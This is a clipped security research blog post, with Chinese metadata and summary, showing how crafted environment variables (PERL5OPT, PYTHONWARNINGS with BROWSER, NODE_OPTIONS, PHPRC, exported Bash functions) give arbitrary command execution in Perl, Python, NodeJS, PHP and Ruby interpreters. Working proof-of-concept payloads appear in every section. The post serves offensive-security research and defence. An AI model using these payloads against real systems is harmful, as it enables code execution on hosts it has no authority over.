---
title: Hacking with Environment Variables - elttam
source: https://www.elttam.com/blog/env
source_host: www.elttam.com
clip_date: 2026-09-18T10:44:43+08:00
trace_id: 5f5a65fc-c7fa-423d-b8ca-05eafb5f6093
content_hash: 721b70c876d2a3dccca9e30e182fc212b50266f2a0d1d40d683a5a580fd9c749
status: synced
tags:
  - 漏洞分析
  - 安全工具
series: null
feed_source: elttam
ai_summary: 通过构造恶意环境变量，无需向磁盘写文件，即可让 Perl、Python、NodeJS、PHP 等脚本语言解释器执行任意命令。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3df75244-d011-811c-a12f-faf1a415d72a
ioc:
  cves:
    - CVE-2016-1531
    - CVE-2019-11043
    - CVE-2019-7609
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 通过构造恶意环境变量，无需向磁盘写文件，即可让 Perl、Python、NodeJS、PHP 等脚本语言解释器执行任意命令。
> 
> - **Perl 单变量 RCE：** `PERL5OPT` 只接受 `CDIMTUWdmtw`，无法用 `-e`；但 `-M` 可在模块名后追加代码，故 `PERL5OPT=-Mbase;print(\`id\`)` 一条变量即可；`-d` + `PERL5DB` 是两变量替代方案。
> - **Python 链路：** `PYTHONSTARTUP` 在执行脚本时失效；`PYTHONWARNINGS` 等价 `-W`，告警类别含点号会触发 `__import__` 任意模块；`antigravity` 调用 webbrowser，`BROWSER` 指定程序但唯一参数是硬编码的 xkcd 链接，故只能选 perldoc/perlthanks 这类脚本而非 perl 本体。
> - **NodeJS 手法：** `NODE_OPTIONS=--require /proc/self/environ`，把首个环境变量的值写成合法 JS；限制是必须知道/爆破首个变量名，且其他变量含换行会语法报错。
> - **PHP 组合：** `PHPRC=/proc/self/environ` 加上 `auto_prepend_file` 等 ini 项，把配置与载荷同放在环境变量中，限制与 NodeJS 相同。
> - **Ruby 现状：** 尚无通用解；`RUBYOPT` 仅允许受限选项，`-r` 只能加载 `.rb`/`.so`；Fedora 上 `/usr/bin/ruby` 是 Bash 脚本，可用导出的 `BASH_FUNC_declare%%` 函数覆盖实现命令执行。

## Introduction

On a recent project we gained the ability to specify environment variables but not the process that was executed.We were also unable to control the contents of a file on disk, and bruteforcing process identifiers (PIDs) and file descriptors found no interesting results, eliminating [remote LD_PRELOAD exploitation](https://www.elttam.com/blog/goahead/).Fortunately, a scripting language interpreter was executed which enabled us to execute arbitrary commands by specifying particular environment variables.This blog post discusses how arbitrary commands can be executed by a range of scripting language interpreters when supplied with malicious environment variables.

## Perl

A quick read of the `ENVIRONMENT` section of the `perlrun(1)` man page reveals plenty of environment variables worth investigating.The `PERL5OPT` environment variable allows specifying command-line options, but is restricted to only accepting the options `CDIMTUWdmtw`.This unfortunately means that `-e`, which allows supplying perl code to run, is out.

All is not lost though, as demonstrated in the [exploit](https://github.com/HackerFantastic/exploits/blob/master/cve-2016-1531.sh) for CVE-2016-1531 by [Hacker Fantastic](https://twitter.com/hackerfantastic).The exploit writes a malicious perl module to `/tmp/root.pm` and supplies the environment variables `PERL5OPT=-Mroot` and `PERL5LIB=/tmp` to achieve arbitrary code execution.However this was an exploit for a local privilege escalation vulnerability and a generic technique should ideally not require access to the file system. Looking at [blasty](https://twitter.com/bl4sty) ’s [exploit](https://haxx.in/blasty-vs-exim.sh) for the same CVE, the exploit did not require creating a file and used the environment variables `PERL5OPT=-d` and `PERL5DB=system('sh');exit;`.The same environment variables were also used to [solve a CTF challenge](https://old.reddit.com/r/netsec/comments/1dm8fv/hack_this_website_and_win_bitcoins_the_first/c9tm6j4/) in 2013.

One final nicety of a generic technique would be to use a single environment variable instead of two.[@justinsteven](https://twitter.com/justinsteven) found this was possible by leveraging `PERL5OPT=-M`.While either `-m` or `-M` can be used to load a perl module, the `-M` option allows adding extra code after the module name.

### Proof of Concept

Figure-0: arbitrary code execution achieved using an environment variable against perl running an empty script (/dev/null)

```bash
$ docker run --env 'PERL5OPT=-Mbase;print(`id`)' perl:5.30.2 perl /dev/null
uid=0(root) gid=0(root) groups=0(root)
```

## Python

Reading the `ENVIRONMENT VARIABLES` section of the `python(1)` man page, `PYTHONSTARTUP` initially appears like it may be a piece of a straightforward solution.It allows specifying a path to a Python script that will be executed prior to displaying the prompt in interactive mode.The interactive mode requirement didn’t seem like it would be an issue as the `PYTHONINSPECT` environment variable can be used to enter interactive mode, the same as specifying `-i` on the command line.However, the documentation for the `-i` option explains that `PYTHONSTARTUP` will not be used when python is started with a script to execute.This means that `PYTHONSTARTUP` and `PYTHONINSPECT` cannot be combined and `PYTHONSTARTUP` only has an effect when the python REPL is immediately launched.This ultimately means that `PYTHONSTARTUP` is not viable as it has no effect when executing a regular Python script.

Other environment variables which looked promising were `PYTHONHOME` and `PYTHONPATH`. Both of these will let you gain arbitrary code execution but require you to also be able to create directories and files on the filesystem. It may be possible to loosen those requirements through the use of the proc filesystem and/or ZIP files.

The majority of the remaining environment variables are simply checked if they contain a non-empty string, and if so, toggle a generally benign setting. One of the rare exceptions to this is `PYTHONWARNINGS`.

### Making progress with PYTHONWARNINGS

The documentation for `PYTHONWARNINGS` states `it is equivalent to specifying the -W option`. The `-W` option is used for warning control to specify which warnings and how often they are printed. The full form of argument is `action:message:category:module:line`. While warning control didn’t seem like a promising lead, that quickly changed after checking the implementation.

Figure-1: Python-3.8.2/Lib/warnings.py

```python
[...]
def _getcategory(category):
    if not category:
        return Warning
    if '.' not in category:
        import builtins as m
        klass = category
    else:
        module, _, klass = category.rpartition('.')
        try:
            m = __import__(module, None, None, [klass])
        except ImportError:
            raise _OptionError('invalid module name: %r' % (module,)) from None
[...]
```

The above code shows that as long as our specified category contains a dot, we can trigger the import an arbitrary Python module.

The next problem is that the vast majority of modules from Python’s standard library run very little code when imported. They tend to just define classes to be used later, and even when they provide code to run, the code is typically [guarded with a check of the `__main__` variable](https://docs.python.org/3/library/__main__.html) (to detect if the file has been imported or run directly).

An unexpected exception to this is the [antigravity module](https://xkcd.com/353/). The Python developers included an [easter egg](https://en.wikipedia.org/wiki/Easter_egg_\(media\)) in [2008](https://github.com/python/cpython/commit/206e3074d34aeb5a4d0c1e24d970b6569f7ad702) which can be triggered by running `import antigravity`. This import will immediately open your browser to the xkcd comic that joked that `import antigravity` in Python would grant you the ability to fly.

As for how the `antigravity` module opens your browser, it uses another module from the standard library called `webbrowser`. This module checks your PATH for a large variety of browsers, including mosaic, opera, skipstone, konqueror, chrome, chromium, firefox, links, elinks and lynx. It also accepts an environment variable `BROWSER` that lets you specify which process should be executed. It is not possible to supply arguments to the process in the environment variable and the xkcd comic URL is the one hard-coded argument for the command.

The ability to turn this into arbitrary code execution depends on what other executables are available on the system.

### Leveraging Perl for Arbitrary Code Execution

One approach is to leverage Perl which is commonly installed on systems and is even available in the standard Python docker image. However, the `perl` binary cannot itself be used. This is because the first and only argument is the xkcd comic URL. The comic URL argument will cause an error and the process to exit without the `PERL5OPT` environment variable being used.

Figure-2: PERL5OPT having no effect when a URL is passed to perl

```bash
$ docker run -e 'PERL5OPT=-Mbase;print(`id`);exit' perl:5.30.2 perl https://xkcd.com/353/
Can't open perl script 'https://xkcd.com/353/': No such file or directory
```

Fortunately, when Perl is available it also common to have the default Perl scripts available, such as perldoc and perlthanks. These scripts will also error and exit with an invalid argument, but the error in this case happens later than the processing of the `PERL5OPT` environment variable. This means you can leverage the Perl environment variable payload detailed earlier in this blog post.

Figure-3: PERL5OPT working as intended with perldoc and perlthanks

```bash
$ docker run -e 'PERL5OPT=-Mbase;print(`id`);exit' perl:5.30.2 perldoc https://xkcd.com/353/
uid=0(root) gid=0(root) groups=0(root)
$ run -e 'PERL5OPT=-Mbase;print(`id`);exit' perl:5.30.2 perlthanks https://xkcd.com/353/
uid=0(root) gid=0(root) groups=0(root)
```

### Proof of Concept

Figure-4: arbitrary code execution achieved using multiple environment variables against Python 2 and Python 3

```bash
$ docker run -e 'PYTHONWARNINGS=all:0:antigravity.x:0:0' -e 'BROWSER=perlthanks' -e 'PERL5OPT=-Mbase;print(`id`);exit;' python:2.7.18 python /dev/null
uid=0(root) gid=0(root) groups=0(root)
Invalid -W option ignored: unknown warning category: 'antigravity.x'

$ docker run -e 'PYTHONWARNINGS=all:0:antigravity.x:0:0' -e 'BROWSER=perlthanks' -e 'PERL5OPT=-Mbase;print(`id`);exit;' python:3.8.2 python /dev/null
uid=0(root) gid=0(root) groups=0(root)
Invalid -W option ignored: unknown warning category: 'antigravity.x'
```

## NodeJS

A [blog post](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) by [Michał Bentkowski](https://twitter.com/securitymb) provided a payload for exploiting Kibana (CVE-2019-7609). A prototype pollution vulnerability was used to set arbitrary environment variables which resulted in arbitrary command execution. Michał’s payload used the `NODE_OPTIONS` environment variable and the [proc filesystem](https://en.wikipedia.org/wiki/Procfs), specifically `/proc/self/environ`.

Although Michał’s technique was creative and worked perfectly for their vulnerability, the technique is not always guaranteed to work and has some constraints that would be nice to remove.

The first constraint is that it using `/proc/self/environ` is only viable if the contents can be made to be syntactically valid JavaScript. This requires being able to create an environment variable and have it appear first in the contents of `/proc/self/environ`, or knowing/bruteforcing the environment variable’s name that will appear first and overwriting it’s value.

Another constraint, as the first environment variable’s value finishes with a single line comment (`//`). Therefore, any newline character in other environment variables will likely cause a syntax error and prevent the payload from executing. The use of multi-line comments (`/*`) will not fix this issue as they must be closed to be syntactically valid. Therefore, in the rare case that an environment variable contains a newline character, it is required to know/bruteforce the environment variable’s name and overwrite it’s value to a new value that does not contain a newline.

Removing these contraints is an exercise left for the reader.

### Proof of Concept

Figure-5: achieving arbitrary code execution with environment variables against NodeJS by Michał Bentkowski

```bash
$ docker run -e 'NODE_VERSION=console.log(require('child_process').execSync('id').toString());//' -e 'NODE_OPTIONS=--require /proc/self/environ' node:14.2.0 node /dev/null
uid=0(root) gid=0(root) groups=0(root)
```

## PHP

If you run `ltrace -e getenv php /dev/null` you will find PHP uses the `PHPRC` environment variable.The environment variable is used when attempting to find and load the configuration file `php.ini`.An exploit by neex for CVE-2019-11043 used a series of [PHP settings](https://github.com/neex/phuip-fpizdam/blob/86bc456bd5d53c77ad54a2252dcaaf1345b1a483/attack.go#L10-L18) to achieve arbitrary code execution.[Orange Tsai](https://twitter.com/orange_8361) also has a [great blog post](https://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html) on creating their own exploit for the same CVE, which uses a slightly different list of settings.Using this knowledge, plus the knowledge gained from the previous NodeJS technique, and some help from [Brendan Scarvell](https://twitter.com/menztrual), a two environment variable solution was found for PHP.

The same constraints exist for this technique as the NodeJS examples.

### Proof of Concept

Figure-6: achieving arbitrary code execution with environment variables against PHP

```bash
$ docker run -e $'HOSTNAME=1;\nauto_prepend_file=/proc/self/environ\n;<?php die(`id`); ?>' -e 'PHPRC=/proc/self/environ' php:7.3 php /dev/null
HOSTNAME=1;
auto_prepend_file=/proc/self/environ
;uid=0(root) gid=0(root) groups=0(root)
```

## Ruby

A generic solution for Ruby has not been found yet.Ruby does accept an environment variable `RUBYOPT` to specify command-line options.The man page states that `RUBYOPT can contain only -d, -E, -I, -K, -r, -T, -U, -v, -w, -W, --debug, --disable-FEATURE and --enable-FEATURE`.The most promising option is `-r` which causes Ruby to load the library using require.However, this is limited to files with an extension of `.rb` or `.so`.

An example of a somewhat useful `.rb` file that has been found is `tools/server.rb` from the json gem that is available after installing Ruby on Fedora systems.When this file is required, a web server is started as shown below:

Figure-7: Using the RUBYOPT environment variable to cause the ruby process to start a web server

```bash
$ docker run -it --env 'RUBYOPT=-r/usr/share/gems/gems/json-2.3.0/tools/server.rb' fedora:33 /bin/bash -c 'dnf install -y ruby 1>/dev/null; ruby /dev/null'
Surf to:
http://27dfc3850fbe:6666
[2020-06-17 05:43:47] INFO  WEBrick 1.6.0
[2020-06-17 05:43:47] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]
[2020-06-17 05:43:47] INFO  WEBrick::HTTPServer#start: pid=28 port=6666
```

Sticking with Fedora, another approach is to leverage the fact that `/usr/bin/ruby` is actually a Bash script which starts `/usr/bin/ruby-mri`. The script calls Bash functions which can be overwritten with environment variables.

### Proof of Concept

Figure-8: Using an exported Bash function to run an arbitrary command

```bash
$ docker run --env 'BASH_FUNC_declare%%=() { id; exit; }' fedora:33 /bin/bash -c 'dnf install ruby -y 1>/dev/null; ruby /dev/null'
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusion

This post has explored interesting use cases of environment variables which could assist in achieving arbitrary code execution against various scripting language interpreters, without writing files to disk.Hopefully you’ve enjoyed reading and are inspired to find and share improved payloads for these and other scripting languages.If you find a generic technique that works against Ruby, we would be very interested in hearing about how you achieved this.

Thanks for reading, ciao Bella!
